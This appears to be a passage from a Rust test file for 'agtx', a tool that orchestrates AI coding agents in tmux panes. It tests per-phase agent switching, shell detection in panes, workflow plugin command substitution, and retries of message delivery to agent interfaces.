    let score_plan = fuzzy_score("/agtx:plan", "plan");
    let score_exec = fuzzy_score("/agtx:execute", "plan");
    assert!(score_plan > 0);
    assert!(score_plan > score_exec);

    // Matching on description
    let score_desc = fuzzy_score("plan a task implementation", "plan");
    assert!(score_desc > 0);
}

// ── Per-Phase Agent Configuration Tests ─────────────────────────────────────

#[test]
fn test_needs_agent_switch_no_config_keeps_current() {
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};
    use crate::db::Task;

    // No [agents] section — should keep whatever agent is running
    let config = MergedConfig::merge(&GlobalConfig::default(), &ProjectConfig::default());
    let task = Task::new("Test", "claude", "project-1");

    let (agent, switch) = needs_agent_switch(&config, &task, "running");
    assert_eq!(agent, "claude");
    assert!(!switch);
}

#[test]
fn test_needs_agent_switch_no_config_falls_back_to_default() {
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};
    use crate::db::Task;

    // No review agent configured, task is running codex (set by explicit running override).
    // Moving to review should switch back to default agent (claude).
    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());
    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    let mut task = Task::new("Test", "claude", "project-1");
    task.agent = "codex".to_string(); // was switched to codex for running phase

    let (agent, switch) = needs_agent_switch(&config, &task, "review");
    assert_eq!(agent, "claude"); // falls back to default agent
    assert!(switch);
}

#[test]
fn test_needs_agent_switch_explicit_override() {
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};
    use crate::db::Task;

    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());
    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    let task = Task::new("Test", "claude", "project-1");

    let (agent, switch) = needs_agent_switch(&config, &task, "running");
    assert_eq!(agent, "codex");
    assert!(switch);
}

#[test]
fn test_needs_agent_switch_explicit_same_as_current() {
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};
    use crate::db::Task;

    // Explicit override exists but matches current agent — no switch needed
    let mut global = GlobalConfig::default();
    global.agents.review = Some("codex".to_string());
    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    let mut task = Task::new("Test", "claude", "project-1");
    task.agent = "codex".to_string();

    let (agent, switch) = needs_agent_switch(&config, &task, "review");
    assert_eq!(agent, "codex");
    assert!(!switch);
}

#[test]
fn test_collect_phase_agents_all_same() {
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};

    let config = MergedConfig::merge(&GlobalConfig::default(), &ProjectConfig::default());
    let agents = collect_phase_agents(&config);
    assert_eq!(agents, vec!["claude".to_string()]);
}

#[test]
fn test_collect_phase_agents_mixed() {
    use crate::config::{GlobalConfig, MergedConfig, ProjectConfig};

    let mut global = GlobalConfig::default();
    global.agents.running = Some("codex".to_string());
    global.agents.review = Some("gemini".to_string());
    let config = MergedConfig::merge(&global, &ProjectConfig::default());
    let agents = collect_phase_agents(&config);
    assert_eq!(
        agents,
        vec![
            "claude".to_string(),
            "codex".to_string(),
            "gemini".to_string()
        ]
    );
}

// === is_pane_at_shell tests ===

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_true_for_bash() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .withf(|t| t == "sess:win")
        .returning(|_| Some("bash".to_string()));

    assert!(is_pane_at_shell(&mock, "sess:win"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_true_for_zsh() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .withf(|t| t == "sess:win")
        .returning(|_| Some("zsh".to_string()));

    assert!(is_pane_at_shell(&mock, "sess:win"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_true_for_fish() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .withf(|t| t == "sess:win")
        .returning(|_| Some("fish".to_string()));

    assert!(is_pane_at_shell(&mock, "sess:win"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_false_for_claude() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .withf(|t| t == "sess:win")
        .returning(|_| Some("claude".to_string()));

    assert!(!is_pane_at_shell(&mock, "sess:win"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_true_for_node() {
    // `node` is intentionally NOT in AGENT_COMMANDS — Node/Ink agents (Gemini, Cursor,
    // OpenCode, Codex) are detected via AGENT_ACTIVE_INDICATORS (Check 2) instead.
    // If node were in AGENT_COMMANDS, Check 1 would fire the moment the node process
    // starts, before the TUI has rendered, sending the prompt too early.
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .withf(|t| t == "sess:win")
        .returning(|_| Some("node".to_string()));

    assert!(is_pane_at_shell(&mock, "sess:win"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_false_for_codex() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .withf(|t| t == "sess:win")
        .returning(|_| Some("codex".to_string()));

    assert!(!is_pane_at_shell(&mock, "sess:win"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_returns_false_when_none() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_pane_current_command()
        .withf(|t| t == "sess:win")
        .returning(|_| None);

    assert!(!is_pane_at_shell(&mock, "sess:win"));
}

/// A process name is matched whole, not by substring.
///
/// `pi` is two characters and `AGENT_COMMANDS` is flat across every agent, so a
/// `contains` test made `pip`, `pipx`, `pipenv` and `pinentry` read as "an agent
/// is running" in *any* task's pane — and `is_pane_at_shell` is the signal for
/// "the agent has exited". Cursor's `agent` had the same shape.
#[test]
#[cfg(feature = "test-mocks")]
fn test_is_pane_at_shell_does_not_match_process_names_by_substring() {
    for cmd in ["pip", "pip3", "pipx", "pipenv", "pinentry", "agentless"] {
        let mut mock = MockTmuxOperations::new();
        mock.expect_pane_current_command()
            .returning(move |_| Some(cmd.to_string()));
        assert!(
            is_pane_at_shell(&mock, "sess:win"),
            "{cmd} must not read as a live agent"
        );
    }

    // The names themselves still match, surrounding whitespace included.
    for cmd in ["pi", "agent", " claude "] {
        let mut mock = MockTmuxOperations::new();
        mock.expect_pane_current_command()
            .returning(move |_| Some(cmd.to_string()));
        assert!(!is_pane_at_shell(&mock, "sess:win"), "{cmd}");
    }
}

// === indicator scoping tests ===

/// `scoped_indicators` must be matched against the bottom of the pane only.
///
/// pi's `%/` is one field of its footer and also occurs in ordinary output, so
/// over a whole capture it finds scrollback rather than a live footer. On the
/// agent-switch path that scrollback belongs to the *previous* agent, which would
/// end the readiness wait before the new agent had execed.
#[test]
fn test_scoped_indicators_are_not_found_in_scrollback() {
    let scrollback_only = format!("Coverage: 85%/90%\n{}", "some later output\n".repeat(20));
    let tail = pane_tail(&scrollback_only, PANE_TAIL_LINES);
    assert!(!tail.contains("%/"), "tail was: {tail:?}");

    // ...and still found where pi actually draws it.
    let live = format!("{}0.0%/1.0M (auto)", "older output\n".repeat(20));
    assert!(pane_tail(&live, PANE_TAIL_LINES).contains("%/"));
}

/// Trailing blank rows must not push the window off the content: `capture-pane -p`
/// emits one line per pane *row*, so an unfilled pane ends in padding.
#[test]
fn test_pane_tail_ignores_trailing_blank_rows() {
    let pane = format!("0.0%/1.0M (auto){}", "\n".repeat(30));
    assert!(pane_tail(&pane, PANE_TAIL_LINES).contains("%/"));
}

/// The flat list is what an unknown agent's pane is matched against, and pi's
/// `%/` must stay out of it in both directions.
#[test]
fn test_flat_and_scoped_indicators_are_disjoint_for_pi() {
    assert!(!flat_indicators_for(Some("pi")).contains(&"%/"));
    assert!(scoped_indicators_for(Some("pi")).contains(&"%/"));
    // An unknown agent gets the flat list and no scoped strings at all.
    assert!(scoped_indicators_for(Some("mistral")).is_empty());
    assert!(scoped_indicators_for(None).is_empty());
}

// === kill_windows_by_name tests ===

#[test]
#[cfg(feature = "test-mocks")]
fn test_kill_windows_by_name_returns_true_when_cleared() {
    use std::sync::atomic::{AtomicUsize, Ordering};
    let mut mock = MockTmuxOperations::new();
    let calls = Arc::new(AtomicUsize::new(0));
    let calls_clone = Arc::clone(&calls);
    mock.expect_window_exists()
        .withf(|t| t == "proj:orchestrator")
        .returning(move |_| Ok(calls_clone.fetch_add(1, Ordering::SeqCst) == 0));
    mock.expect_kill_window()
        .withf(|t| t == "proj:orchestrator")
        .returning(|_| Ok(()));

    assert!(kill_windows_by_name(&mock, "proj:orchestrator"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_kill_windows_by_name_returns_false_when_cap_exhausted() {
    // Pins the 16-iteration cap: lowering it regresses `.times(16)`.
    let mut mock = MockTmuxOperations::new();
    mock.expect_window_exists()
        .withf(|t| t == "proj:orchestrator")
        .returning(|_| Ok(true));
    mock.expect_kill_window()
        .withf(|t| t == "proj:orchestrator")
        .times(16)
        .returning(|_| Ok(()));

    assert!(!kill_windows_by_name(&mock, "proj:orchestrator"));
}

// === is_orchestrator_live tests ===

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_orchestrator_live_false_when_window_missing() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_window_exists()
        .withf(|t| t == "proj:orchestrator")
        .returning(|_| Ok(false));

    assert!(!is_orchestrator_live(&mock, "proj:orchestrator"));
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_is_orchestrator_live_ignores_pane_current_command() {
    let mut mock = MockTmuxOperations::new();
    mock.expect_window_exists()
        .withf(|t| t == "proj:orchestrator")
        .returning(|_| Ok(true));

    assert!(is_orchestrator_live(&mock, "proj:orchestrator"));
}

// === switch_agent_in_tmux tests ===

/// Test that switch_agent_in_tmux sends the correct exit command per agent
/// and starts the new agent. Uses relaxed mocking since the function has
/// multiple polling loops with retries.
#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_claude_sends_exit() {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let mut mock = MockTmuxOperations::new();
    let exit_sent = Arc::new(AtomicBool::new(false));
    let new_agent_sent = Arc::new(AtomicBool::new(false));
    let exit_sent_c = exit_sent.clone();
    let new_agent_sent_c = new_agent_sent.clone();

    // Claude uses /exit
    mock.expect_send_keys().returning(move |_, k| {
        if k == "/exit" {
            exit_sent_c.store(true, Ordering::SeqCst);
        }
        if k == "env -u CLAUDECODE -u CLAUDE_CODE_ENTRYPOINT codex" {
            new_agent_sent_c.store(true, Ordering::SeqCst);
        }
        Ok(())
    });
    mock.expect_send_key().returning(|_, _| Ok(()));
    // Return shell immediately so polling exits fast
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane().returning(|_| Ok(String::new()));

    switch_agent_in_tmux(&mock, "sess:win", "claude", "codex");
    assert!(
        exit_sent.load(Ordering::SeqCst),
        "/exit should be sent for claude"
    );
    assert!(
        new_agent_sent.load(Ordering::SeqCst),
        "new agent command should be sent"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_gemini_sends_quit() {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let mut mock = MockTmuxOperations::new();
    let quit_sent = Arc::new(AtomicBool::new(false));
    let quit_sent_c = quit_sent.clone();

    mock.expect_send_keys().returning(|_, _| Ok(()));
    mock.expect_send_key().returning(|_, _| Ok(()));
    // Gemini's /quit is *text*, sent via send_text (`send-keys -l`) with a delay
    // before the separate Enter keypress, which the Ink TUI needs to render first.
    mock.expect_send_text().returning(move |_, k| {
        if k == "/quit" {
            quit_sent_c.store(true, Ordering::SeqCst);
        }
        Ok(())
    });
    mock.expect_pane_current_command()
        .returning(|_| Some("zsh".to_string()));
    mock.expect_capture_pane().returning(|_| Ok(String::new()));

    switch_agent_in_tmux(&mock, "sess:win", "gemini", "claude");
    assert!(
        quit_sent.load(Ordering::SeqCst),
        "/quit should be sent for gemini"
    );
}

#[test]
#[cfg(feature = "test-mocks")]
fn test_switch_agent_codex_sends_ctrl_c() {
    use std::sync::atomic::{AtomicBool, Ordering};
    use std::sync::Arc;

    let mut mock = MockTmuxOperations::new();
    let ctrl_c_sent = Arc::new(AtomicBool::new(false));
    let ctrl_c_sent_c = ctrl_c_sent.clone();

    mock.expect_send_keys().returning(|_, _| Ok(()));
    mock.expect_send_key().returning(move |_, k| {
        if k == "C-c" {
            ctrl_c_sent_c.store(true, Ordering::SeqCst);
        }
        Ok(())
    });
    mock.expect_pane_current_command()
        .returning(|_| Some("bash".to_string()));
    mock.expect_capture_pane().returning(|_| Ok(String::new()));

    switch_agent_in_tmux(&mock, "sess:win", "codex", "claude");
    assert!(
        ctrl_c_sent.load(Ordering::SeqCst),
        "Ctrl+C should be sent for codex"
    );
}

// =============================================================================
// Tests for cyclic phase support and {phase} substitution
// =============================================================================

/// The launch lane passes the command in argv, where a newline is just a byte,
/// so `{task}` keeps the structure its author wrote. The typed path cannot: it
/// sends with `send_keys`, where a newline is a real Enter that would submit the
/// message half-written.
#[test]
fn test_resolve_skill_command_collapse_controls_task_structure() {
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"
        name = "spec-kit"
        [commands]
        planning = "/speckit.specify {task}"
        [prompts]
        [artifacts]
    "#,
    )
    .unwrap();
    let plugin = Some(plugin);
    let task = "Add a login form.\n\n- email field\n- password field";

    let collapsed =
        resolve_skill_command(&plugin, "planning", "claude", task, 1, "id-1", true).unwrap();
    assert_eq!(
        collapsed, "/speckit.specify Add a login form. - email field - password field",
        "typed path must stay on one line"
    );
    assert!(!collapsed.contains('\n'));

    let verbatim =
        resolve_skill_command(&plugin, "planning", "claude", task, 1, "id-1", false).unwrap();
    assert_eq!(verbatim, format!("/speckit.specify {task}"));
    assert!(
        verbatim.contains("\n\n- email field"),
        "launch lane must preserve blank lines and list structure: {verbatim:?}"
    );
}

/// Collapsing is only about `{task}`; a command without the placeholder is
/// identical either way.
#[test]
fn test_resolve_skill_command_collapse_is_a_noop_without_task_placeholder() {
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(
        r#"
        name = "agtx"
        [commands]
        planning = "/agtx:plan {task_id}"
        [prompts]
        [artifacts]
    "#,
    )
    .unwrap();
    let plugin = Some(plugin);
    let task = "line one\nline two";
    assert_eq!(
        resolve_skill_command(&plugin, "planning", "claude", task, 1, "id-1", true),
        resolve_skill_command(&plugin, "planning", "claude", task, 1, "id-1", false),
    );
}

#[test]
fn test_resolve_skill_command_phase_substitution() {
    use crate::config::{PluginCommands, WorkflowPlugin};
    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        preresearch = "/gsd:new-project"
        research = "/gsd:discuss-phase {phase}"
        planning = "/gsd:plan-phase {phase}"
        running = "/gsd:execute-phase {phase}"
        review = "/gsd:verify-work {phase}"
        [prompts]
        [artifacts]
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let p = Some(plugin);

    // Cycle 1: {phase} → "1"
    assert_eq!(
        resolve_skill_command(&p, "planning", "claude", "", 1, "", true),
        Some("/gsd:plan-phase 1".to_string())
    );
    assert_eq!(
        resolve_skill_command(&p, "running", "claude", "", 1, "", true),
        Some("/gsd:execute-phase 1".to_string())
    );
    assert_eq!(
        resolve_skill_command(&p, "review", "claude", "", 1, "", true),
        Some("/gsd:verify-work 1".to_string())
    );

    // Cycle 2: {phase} → "2"
    assert_eq!(
        resolve_skill_command(&p, "planning", "claude", "", 2, "", true),
        Some("/gsd:plan-phase 2".to_string())
    );
    assert_eq!(
        resolve_skill_command(&p, "running", "claude", "", 2, "", true),
        Some("/gsd:execute-phase 2".to_string())
    );
    assert_eq!(
        resolve_skill_command(&p, "review", "claude", "", 2, "", true),
        Some("/gsd:verify-work 2".to_string())
    );

    // preresearch also gets {phase} substitution (falls back to research command)
    assert_eq!(
        resolve_skill_command(&p, "preresearch", "claude", "", 1, "", true),
        Some("/gsd:new-project".to_string())
    );
}

#[test]
fn test_phase_artifact_exists_with_phase_substitution() {
    use crate::config::{PluginArtifacts, WorkflowPlugin};

    let tmp = std::env::temp_dir().join("agtx_test_phase_artifact");
    let _ = std::fs::remove_dir_all(&tmp);

    // Create .planning/2/UAT.md to simulate phase 2 review artifact
    let phase_dir = tmp.join(".planning").join("2");
    std::fs::create_dir_all(&phase_dir).unwrap();
    std::fs::write(phase_dir.join("UAT.md"), "# UAT").unwrap();

    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        [prompts]
        [artifacts]
        review = ".planning/{phase}/UAT.md"
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let p = Some(plugin);
    let wt = tmp.to_string_lossy().to_string();

    // Phase 1: artifact doesn't exist
    assert!(!phase_artifact_exists(&wt, TaskStatus::Review, &p, 1));

    // Phase 2: artifact exists
    assert!(phase_artifact_exists(&wt, TaskStatus::Review, &p, 2));

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn test_determine_phase_variant_planning_no_artifact() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    assert_eq!(
        determine_phase_variant("planning", Some(&wt), "task-1", &None, 1),
        "planning"
    );
}

#[test]
fn test_determine_phase_variant_planning_with_research() {
    use crate::config::WorkflowPlugin;
    let dir = tempfile::tempdir().unwrap();
    let artifact_dir = dir.path().join(".planning").join("phases").join("research");
    std::fs::create_dir_all(&artifact_dir).unwrap();
    std::fs::write(artifact_dir.join("01-CONTEXT.md"), "# Context").unwrap();

    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        [prompts]
        [artifacts]
        research = ".planning/phases/research/{phase}-CONTEXT.md"
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    assert_eq!(
        determine_phase_variant("planning", Some(&wt), "task-1", &Some(plugin), 1),
        "planning_with_research"
    );
}

#[test]
fn test_determine_phase_variant_running_no_artifact() {
    let dir = tempfile::tempdir().unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    assert_eq!(
        determine_phase_variant("running", Some(&wt), "task-1", &None, 1),
        "running"
    );
}

#[test]
fn test_determine_phase_variant_running_with_planning() {
    use crate::config::WorkflowPlugin;
    let dir = tempfile::tempdir().unwrap();
    let plan_dir = dir.path().join(".planning").join("01");
    std::fs::create_dir_all(&plan_dir).unwrap();
    std::fs::write(plan_dir.join("PLAN.md"), "# Plan").unwrap();

    let plugin_toml = r#"
        name = "gsd"
        init_script = "echo test"
        [commands]
        [prompts]
        [artifacts]
        planning = ".planning/{phase}/PLAN.md"
    "#;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let wt = dir.path().to_string_lossy().to_string();
    assert_eq!(
        determine_phase_variant("running", Some(&wt), "task-1", &Some(plugin), 1),
        "running_with_research_or_planning"
    );
}

#[test]
fn test_determine_phase_variant_review_passthrough() {
    assert_eq!(
        determine_phase_variant("review", None, "t", &None, 1),
        "review"
    );
}

#[test]
fn test_footer_text_review_non_cyclic_no_next_phase() {
    let text = build_footer_text(None, false, 3, false, false);
    assert!(!text.contains("[p] next phase"));
    assert!(text.contains("[m] move"));
}

#[test]
fn test_resolve_skill_command_preresearch_fallback() {
    // When preresearch is not set, falls back to research command
    let plugin_toml = r#"
        name = "test"
        init_script = "echo test"
        [commands]
        research = "/test:discuss"
        [prompts]
        [artifacts]
    "#;
    use crate::config::WorkflowPlugin;
    let plugin: WorkflowPlugin = toml::from_str(plugin_toml).unwrap();
    let p = Some(plugin);
    assert_eq!(
        resolve_skill_command(&p, "preresearch", "claude", "", 1, "", true),
        Some("/test:discuss".to_string())
    );
}

#[test]
fn test_copy_back_to_project() {
    let tmp = std::env::temp_dir().join("agtx_test_copy_back");
    let _ = std::fs::remove_dir_all(&tmp);

    let worktree = tmp.join("worktree");
    let project = tmp.join("project");
    std::fs::create_dir_all(&worktree).unwrap();
    std::fs::create_dir_all(&project).unwrap();

    // Create files in worktree
    std::fs::write(worktree.join("PROJECT.md"), "# Project").unwrap();
    std::fs::write(worktree.join("ROADMAP.md"), "# Roadmap").unwrap();
    let planning_dir = worktree.join(".planning");
    std::fs::create_dir_all(&planning_dir).unwrap();
    std::fs::write(planning_dir.join("context.md"), "# Context").unwrap();

    // Copy back
    let entries = vec![
        "PROJECT.md".to_string(),
        "ROADMAP.md".to_string(),
        ".planning".to_string(),
        "NONEXISTENT.md".to_string(), // Should be silently skipped
    ];
    copy_back_to_project(&worktree, &project, &entries);

    // Verify files were copied
    assert!(project.join("PROJECT.md").exists());
    assert!(project.join("ROADMAP.md").exists());
    assert!(project.join(".planning").join("context.md").exists());
    assert!(!project.join("NONEXISTENT.md").exists());

    let _ = std::fs::remove_dir_all(&tmp);
}

#[test]
fn test_gsd_plugin_has_cyclic_and_copy_back() {
    use crate::config::WorkflowPlugin;
    let (_name, _desc, content) = skills::BUNDLED_PLUGINS
        .iter()
        .find(|(n, _, _)| *n == "gsd")
        .expect("gsd plugin should be bundled");
    let plugin: WorkflowPlugin = toml::from_str(content).unwrap();
    assert!(plugin.cyclic);
    assert!(plugin.copy_back.contains_key("preresearch"));
    let preresearch_entries = &plugin.copy_back["preresearch"];
    assert!(preresearch_entries.contains(&".planning/PROJECT.md".to_string()));
}

// =============================================================================
// Tests for send_skill_and_prompt
// =============================================================================

/// A message the agent's TUI never echoed was dropped, not delayed — that is
/// what a pane unchanged across the whole confirm budget means. Resending is the
/// only recovery: `wait_for_agent_ready` cannot prove an Ink-class TUI has
/// attached its stdin reader, and a dropped send is otherwise silent and total.
#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_message_resends_while_the_pane_is_unchanged() {
    let mut mock = MockTmuxOperations::new();
    let pastes = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    let pastes_c = pastes.clone();
    mock.expect_send_key().returning(|_, _| Ok(())); // the C-u before each resend
    mock.expect_paste_text().returning(move |_, _| {
        *pastes_c.lock().unwrap() += 1;
        Ok(())
    });
    mock.expect_capture_pane()
        .returning(|_| Ok("frozen splash".to_string()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    assert!(!deliver_message(&tmux, "sess:win", "hello", true));
    assert_eq!(*pastes.lock().unwrap(), DELIVERY_ATTEMPTS as usize);
}

/// ...and the moment the pane redraws it stops, because a redraw means the
/// message landed and a resend would double it — the same rule
/// `dismiss_launch_dialog` uses for a dropped keystroke.
#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_message_stops_as_soon_as_the_pane_redraws() {
    let mut mock = MockTmuxOperations::new();
    let sends = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    let sends_c = sends.clone();
    mock.expect_send_text().returning(move |_, _| {
        *sends_c.lock().unwrap() += 1;
        Ok(())
    });
    expect_echoing_pane(&mut mock, "composer");

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    assert!(deliver_message(&tmux, "sess:win", "hello", false));
    assert_eq!(*sends.lock().unwrap(), 1, "no resend after a redraw");
}

/// The antigravity failure mode end to end: the paste is dropped by a TUI that
/// is not reading yet, so the combined send must retry rather than submit an
/// empty composer.
#[test]
#[cfg(feature = "test-mocks")]
fn test_combined_send_retries_a_dropped_paste() {
    let mut mock = MockTmuxOperations::new();
    let pastes = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let pastes_c = pastes.clone();
    mock.expect_send_key().returning(|_, _| Ok(()));
    mock.expect_paste_text().returning(move |_, text| {
        pastes_c.lock().unwrap().push(text.to_string());
        Ok(())
    });
    mock.expect_capture_pane()
        .returning(|_| Ok("Do you trust the contents of this project?".to_string()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    send_skill_and_prompt(
        &tmux,
        "sess:win",
        &Some("/agtx-plan abc".to_string()),
        "",
        &None,
        "task",
        "antigravity",
        &[],
        false,
    );
    let pasted = pastes.lock().unwrap();
    assert_eq!(pasted.len(), DELIVERY_ATTEMPTS as usize);
    assert!(pasted.iter().all(|p| p.contains("/agtx-plan abc")));
}

/// A pane that never goes quiet cannot confirm delivery by "something changed" —
/// the change is the agent's own output. Confirming on the text itself is what
/// keeps the busy case honest; without it the first poll always says "landed",
/// which is exactly the case the settle step was added for.
#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_message_on_a_busy_pane_confirms_on_the_text_not_the_change() {
    let mut mock = MockTmuxOperations::new();
    let sends = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    let sends_c = sends.clone();
    let counter = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    mock.expect_send_key().returning(|_, _| Ok(()));
    mock.expect_paste_text().returning(move |_, _| {
        *sends_c.lock().unwrap() += 1;
        Ok(())
    });
    // Never the same twice, and never containing the message: a streaming pane
    // that dropped what it was sent.
    mock.expect_capture_pane().returning(move |_| {
        let mut n = counter.lock().unwrap();
        *n += 1;
        Ok(format!("streaming line {n}"))
    });

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    assert!(!deliver_message(
        &tmux,
        "sess:win",
        "/agtx-plan abc-123",
        true
    ));
    assert_eq!(
        *sends.lock().unwrap(),
        DELIVERY_ATTEMPTS as usize,
        "a busy pane that never shows the text must still retry"
    );
}

/// ...and once the text does appear on that busy pane, it stops.
#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_message_on_a_busy_pane_stops_once_the_text_appears() {
    let mut mock = MockTmuxOperations::new();
    let sends = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    let sends_c = sends.clone();
    let counter = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    mock.expect_send_key().returning(|_, _| Ok(()));
    mock.expect_paste_text().returning(move |_, _| {
        *sends_c.lock().unwrap() += 1;
        Ok(())
    });
    mock.expect_capture_pane().returning(move |_| {
        let mut n = counter.lock().unwrap();
        *n += 1;
        // Still streaming, but the composer now echoes the message — wrapped and
        // re-indented, the way a real one does.
        Ok(format!("streaming {n}\n  >  /agtx-plan\n     abc-123"))
    });

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    assert!(deliver_message(
        &tmux,
        "sess:win",
        "/agtx-plan abc-123",
        true
    ));
    assert_eq!(
        *sends.lock().unwrap(),
        1,
        "no resend once the text is visible"
    );
}

/// A resend clears the composer first: "nothing was seen to land" is not "nothing
/// landed", and a late redraw would otherwise leave the agent holding the message
/// twice, concatenated.
#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_message_clears_the_composer_before_a_resend() {
    let mut mock = MockTmuxOperations::new();
    let keys = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
    let keys_c = keys.clone();
    mock.expect_send_key().returning(move |_, k| {
        keys_c.lock().unwrap().push(k.to_string());
        Ok(())
    });
    mock.expect_paste_text().returning(|_, _| Ok(()));
    mock.expect_capture_pane()
        .returning(|_| Ok("frozen".to_string()));

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    assert!(!deliver_message(&tmux, "sess:win", "hello there", true));
    let keys = keys.lock().unwrap();
    assert_eq!(
        keys.iter().filter(|k| k.as_str() == "C-u").count(),
        DELIVERY_ATTEMPTS as usize - 1,
        "one clear before each resend, never before the first send: {keys:?}"
    );
}

/// The needle is short and whitespace-insensitive on both sides, because a
/// composer wraps and re-indents what it echoes.
#[test]
fn test_delivery_needle_survives_wrapping() {
    let needle = delivery_needle("/agtx-plan 57d57fe8-5990\n\nSMOKE TEST").unwrap();
    assert!(pane_shows(
        "  >  /agtx-plan\n     57d57fe8-5990 ...",
        &needle
    ));
    assert!(!pane_shows("  >  waiting for input", &needle));
    // Nothing distinctive enough to look for.
    assert!(delivery_needle("hi").is_none());
    assert!(delivery_needle("   ").is_none());
}

/// A phase advance fires as soon as the artifact appears, which can be while the
/// agent is still writing its closing lines — and a composer mid-render may not
/// take the message at all. Worse, a pane changing on its own makes the delivery
/// confirmation meaningless: the change it sees is the agent's output, not the
/// echo. So the send waits for quiet first.
#[test]
#[cfg(feature = "test-mocks")]
fn test_deliver_message_waits_for_the_pane_to_go_quiet_first() {
    let mut mock = MockTmuxOperations::new();
    let captures_before_send = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    let counter = std::sync::Arc::new(std::sync::Mutex::new(0usize));
    let seen = captures_before_send.clone();
    let sent = std::sync::Arc::new(std::sync::Mutex::new(false));
    let sent_c = sent.clone();
    let counter_c = counter.clone();

    mock.expect_capture_pane().returning(move |_| {
        let mut n = counter_c.lock().unwrap();
        *n += 1;
        if !*sent_c.lock().unwrap() {
            *seen.lock().unwrap() = *n;
        }
        // Streaming output for the first few polls, then quiet.
        Ok(if *n <= 3 {
            format!("streaming {n}")
        } else if *sent_c.lock().unwrap() {
            "echoed".to_string()
        } else {
            "quiet".to_string()
        })
    });
    let sent_w = sent.clone();
    mock.expect_paste_text().returning(move |_, _| {
        *sent_w.lock().unwrap() = true;
        Ok(())
    });

    let tmux: std::sync::Arc<dyn TmuxOperations> = std::sync::Arc::new(mock);
    assert!(deliver_message(&tmux, "sess:win", "hello", true));
    assert!(
        *captures_before_send.lock().unwrap() > 3,
        "the send must wait out the streaming output, not fire into it"
    );
}

/// A `capture_pane` that models an idle pane which then echoes what was sent:
/// quiet long enough for `wait_for_pane_settled`, then changed once, so
/// [`deliver_message`] confirms on its first poll and does not resend.
///
/// The number of quiet captures is derived from the settle constants rather than
/// hardcoded, so tuning them does not silently turn these tests into
/// resend-three-times tests. A pane that *never* changes is what a dropped
/// message looks like, and is covered on purpose by
/// `test_deliver_message_resends_while_the_pane_is_unchanged`.
#[cfg(feature = "test-mocks")]
